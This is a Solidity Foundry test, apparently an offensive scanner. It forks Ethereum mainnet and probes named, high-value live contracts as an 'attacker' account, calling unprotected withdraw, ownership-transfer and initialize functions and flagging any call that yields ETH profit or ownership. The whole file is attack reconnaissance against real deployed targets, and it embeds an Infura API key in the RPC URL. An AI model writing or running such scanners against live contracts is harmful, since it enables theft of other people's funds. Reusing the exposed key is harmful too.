// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Mass Contract Scanner - Simplified
 * @notice Scans high-value contracts for vulnerabilities
 */

contract MassContractScanTest is Test {
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    address attacker;
    string rpc = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(rpc);
        attacker = makeAddr("attacker");
    }

    function testScanHighValueBatch() public {
        console.log("=== SCANNING HIGHEST VALUE CONTRACTS ===");
        console.log("");

        // Use addresses that we know compile correctly
        _analyzeContract(0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367, "16k ETH");
        _analyzeContract(0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918, "11k ETH");
        _analyzeContract(0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d, "7k ETH");
        _analyzeContract(0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329, "6k ETH");
        _analyzeContract(0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0, "800 ETH");
        _analyzeContract(0x446B86A33E2a438f569B15855189e3dA28d027ba, "621 ETH");
        _analyzeContract(0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83, "400 ETH");
    }

    function testCheckPendingOwnerExploits() public {
        console.log("=== CHECKING FOR PENDING OWNER EXPLOITS ===");
        console.log("");

        _checkPendingOwner(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4, "DolaSavings");
        _checkPendingOwner(0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6, "SavingAccount");
        _checkPendingOwner(0x10ab606B067C9C461d8893c47C7512472E19e2Ce, "StakingRewards");
        _checkPendingOwner(0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367, "16k ETH");
        _checkPendingOwner(0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918, "11k ETH");
    }

    function testProbeInitializationVulns() public {
        console.log("=== PROBING FOR INITIALIZATION VULNERABILITIES ===");
        console.log("");

        _checkInitialization(0x73Faec34b4a800b3fF7fbb9e8F3bc2F4Eb84737A, "Proxy 0x73Fa");
        _checkInitialization(0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329, "6k ETH");
        _checkInitialization(0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0, "800 ETH");
        _checkInitialization(0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83, "400 ETH");
        _checkInitialization(0xa1E2481a9CD0Cb0447EeB1cbc26F1b3fff3bec20, "Proxy a1E2");
    }

    function _analyzeContract(address target, string memory label) internal {
        if (target.code.length == 0) return;

        console.log("========================================");
        console.log(label);
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18);
        console.log("Code size:", target.code.length);

        // Read first few storage slots
        console.log("");
        console.log("[Storage]");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i);
                console.log("  Value:", uint256(slot));

                address asAddr = address(uint160(uint256(slot)));
                if (asAddr != address(0) && asAddr.code.length > 0) {
                    console.log("  -> Contract at:", asAddr);
                }
            }
        }

        // Check ownership
        console.log("");
        console.log("[Ownership]");
        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            address owner = abi.decode(d1, (address));
            console.log("owner():", owner);
            if (owner.code.length == 0 && owner != address(0)) {
                console.log("  [!] Owner is EOA");
            }
        }

        (bool s2, bytes memory d2) = target.staticcall(abi.encodeWithSignature("gov()"));
        if (s2 && d2.length >= 32) {
            console.log("gov():", abi.decode(d2, (address)));
        }

        // Probe privileged functions
        console.log("");
        console.log("[Privilege Probe]");
        vm.startPrank(attacker);
        uint256 ethBefore = attacker.balance;

        (bool w1,) = target.call(abi.encodeWithSignature("withdraw()"));
        if (w1 && attacker.balance > ethBefore) {
            console.log("[!!!EXPLOIT!!!] withdraw() succeeded with profit!");
            console.log("Profit:", (attacker.balance - ethBefore) / 1e18, "ETH");
        }

        (bool w2,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        if (w2 && attacker.balance > ethBefore) {
            console.log("[!!!EXPLOIT!!!] emergencyWithdraw() succeeded!");
        }

        (bool w3,) = target.call(abi.encodeWithSignature("transferOwnership(address)", attacker));
        if (w3) {
            console.log("[!!!CRITICAL!!!] transferOwnership succeeded!");
        }

        (bool w4,) = target.call(abi.encodeWithSignature("initialize()"));
        if (w4) {
            console.log("[!!!CRITICAL!!!] initialize() succeeded!");
        }

        vm.stopPrank();
        console.log("");
    }

    function _checkPendingOwner(address target, string memory label) internal view {
        if (target.code.length == 0) return;

        console.log("Checking:", label);

        // Check pendingOwner
        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("pendingOwner()"));
        if (s1 && d1.length >= 32) {
            address pending = abi.decode(d1, (address));
            if (pending != address(0)) {
                console.log("[!] FOUND PENDING OWNER!");
                console.log("  Contract:", target);
                console.log("  PendingOwner:", pending);
                console.log("  ETH Balance:", target.balance / 1e18);
            }
        }

        // Check pendingGov
        (bool s2, bytes memory d2) = target.staticcall(abi.encodeWithSignature("pendingGov()"));
        if (s2 && d2.length >= 32) {
            address pending = abi.decode(d2, (address));
            if (pending != address(0)) {
                console.log("[!] FOUND PENDING GOV!");
                console.log("  Contract:", target);
                console.log("  PendingGov:", pending);
            }
        }
    }

    function _checkInitialization(address target, string memory label) internal {
        if (target.code.length == 0) return;

        console.log("Checking:", label);
        console.log("  Target:", target);
        console.log("  ETH:", target.balance / 1e18);

        // Read EIP-1967 implementation slot
        bytes32 implSlot = vm.load(target, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));

        if (impl != address(0) && impl.code.length > 0) {
            console.log("  Is Proxy - Implementation:", impl);

            // Try to initialize implementation directly
            vm.startPrank(attacker);

            (bool s1,) = impl.call(abi.encodeWithSignature("initialize()"));
            if (s1) {
                console.log("  [!!!] initialize() succeeded on implementation!");

                // Check if we became owner
                (bool ownerSuccess, bytes memory ownerData) = impl.staticcall(abi.encodeWithSignature("owner()"));
                if (ownerSuccess && ownerData.length >= 32) {
                    address owner = abi.decode(ownerData, (address));
                    if (owner == attacker) {
                        console.log("  [EXPLOIT!] Attacker is owner of implementation!");
                    }
                }
            }

            (bool s2,) = impl.call(abi.encodeWithSignature("initialize(address)", attacker));
            if (s2) {
                console.log("  [!!!] initialize(address) succeeded on implementation!");
            }

            vm.stopPrank();
        } else {
            // Not a proxy - try to initialize directly
            vm.startPrank(attacker);

            (bool s1,) = target.call(abi.encodeWithSignature("initialize()"));
            if (s1) {
                console.log("  [!!!] initialize() succeeded directly!");
            }

            (bool s2,) = target.call(abi.encodeWithSignature("initialize(address)", attacker));
            if (s2) {
                console.log("  [!!!] initialize(address) succeeded directly!");
            }

            vm.stopPrank();
        }
        console.log("");
    }

    receive() external payable {}
}
